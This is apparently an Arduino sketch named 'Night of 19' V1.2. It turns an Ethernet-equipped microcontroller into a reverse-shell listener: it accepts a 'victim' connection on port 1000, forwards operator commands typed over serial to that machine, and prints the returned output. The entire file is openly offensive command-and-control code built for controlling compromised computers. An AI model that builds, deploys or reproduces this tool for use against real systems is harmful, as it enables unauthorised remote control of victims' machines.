/*
 __    __  __            __          __                       ______           __     ______  
/  \  /  |/  |          /  |        /  |                     /      \        _/  |   /      \ 
$$  \ $$ |$$/   ______  $$ |____   _$$ |_           ______  /$$$$$$  |      / $$ |  /$$$$$$  |
$$$  \$$ |/  | /      \ $$      \ / $$   |         /      \ $$ |_ $$/       $$$$ |  $$ \__$$ |
$$$$  $$ |$$ |/$$$$$$  |$$$$$$$  |$$$$$$/         /$$$$$$  |$$   |            $$ |  $$    $$ |
$$ $$ $$ |$$ |$$ |  $$ |$$ |  $$ |  $$ | __       $$ |  $$ |$$$$/             $$ |   $$$$$$$ |
$$ |$$$$ |$$ |$$ \__$$ |$$ |  $$ |  $$ |/  |      $$ \__$$ |$$ |             _$$ |_ /  \__$$ |
$$ | $$$ |$$ |$$    $$ |$$ |  $$ |  $$  $$/       $$    $$/ $$ |            / $$   |$$    $$/ 
$$/   $$/ $$/  $$$$$$$ |$$/   $$/    $$$$/         $$$$$$/  $$/             $$$$$$/  $$$$$$/  
              /  \__$$ |                                                                      
              $$    $$/                             Version:V1.2                                          
               $$$$$$/                           @https://github.com/MartinxMax
*/
#include <UIPEthernet.h>
#define UARTBAUD 9600
#define SERVER_PORT 1000
byte mac[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED };
unsigned long start_time = millis();
EthernetServer server(SERVER_PORT);

String hacker_cmd() {
  String CMD;
  while (Serial.available()) {
    char c = Serial.read();
    CMD += c;
  }
  return CMD;
}

void format_display(int method) {

  Serial.print("[TIME:");
  Serial.print(millis() - start_time);
  Serial.print("/ms]");
  if (method == 0) {
    Serial.print(" [INFO] ");
  } else if (method == 1) {
    Serial.print(" [WARING] ");
  } else if (method == 2) {
    Serial.print(" [ERROR] ");
  } else {
    Serial.print("");
  }
}

void my_ip() {
  format_display(0);
  Serial.print("Listen IP/Port >");
  Serial.print(Ethernet.localIP());
  Serial.print(":");
  Serial.println(SERVER_PORT);
  format_display(1);
  Serial.println("Server Runing....");
}

void victim_info(EthernetClient VICTIM_SOCKET, int method) {
  if (method == 0) {
    format_display(0);
    Serial.print("victim connect >");
  } else if (method == 1) {
    format_display(1);
    Serial.print("victim disconnect >");
  } else {
    format_display(2);
    Serial.print("Have a Error");
  }
  Serial.print(VICTIM_SOCKET.remoteIP());
  Serial.print(":");
  Serial.println(VICTIM_SOCKET.remotePort());
}

void victim_machine() {
  EthernetClient VICTIM_SOCKET = server.available();
  String victim_result = "";
  String CMD = "";
  if (VICTIM_SOCKET) {
    if (VICTIM_SOCKET.connected()) {
      victim_info(VICTIM_SOCKET, 0);
      while (VICTIM_SOCKET.connected()) {
        if (Serial.available() > 0) {
          CMD = hacker_cmd();
          delay(400);
          format_display(0);
          Serial.println("Got your command");
        }
        if (CMD.length() > 0) {
          VICTIM_SOCKET.println(CMD);
          format_display(0);
          Serial.print("send command to >");
          Serial.println(Ethernet.localIP());
          CMD = "";
          delay(1000);  // 等待操作完成
        } else {
          VICTIM_SOCKET.println("");
          CMD = "";
          delay(3000);  // 等待客户端的响应
        }
        if (!VICTIM_SOCKET.connected()) {
          victim_info(VICTIM_SOCKET, 1);
          CMD = "";
          victim_result = "";
          break;
        } else {
          while (VICTIM_SOCKET.available() > 0) {
            char c = VICTIM_SOCKET.read();
            victim_result += c;
          }
          if (victim_result.length() > 0) {
            Serial.println(victim_result);
          }
           victim_result = "";
        }
      }
    }
    VICTIM_SOCKET.stop();
  }
}


void setup() {
  // uint8_t myIP[4] = { MYIPADDR };
  // uint8_t myMASK[4] = { MYIPMASK };
  // uint8_t myDNS[4] = { MYDNS };
  // uint8_t myGW[4] = { MYGW };
  Serial.begin(UARTBAUD);
  delay(20000); 
  Serial.println("Night of 19 @version-1.2 @by Maptnh.");
  Ethernet.begin(mac);
  // Ethernet.begin(mac, myIP, myDNS, myGW, myMASK);
  if (Ethernet.localIP()) {
    format_display(0);
    Serial.println("Successfully obtained DHCP service");
    my_ip();
    server.begin();
    delay(1000);
    format_display(0);
    Serial.print("Serial Port Baud Rate:");
    Serial.println(UARTBAUD);
  } else {
    format_display(2);
    Serial.println("Exception in obtaining DHCP service");
  }
}

void loop() {
  victim_machine();
}
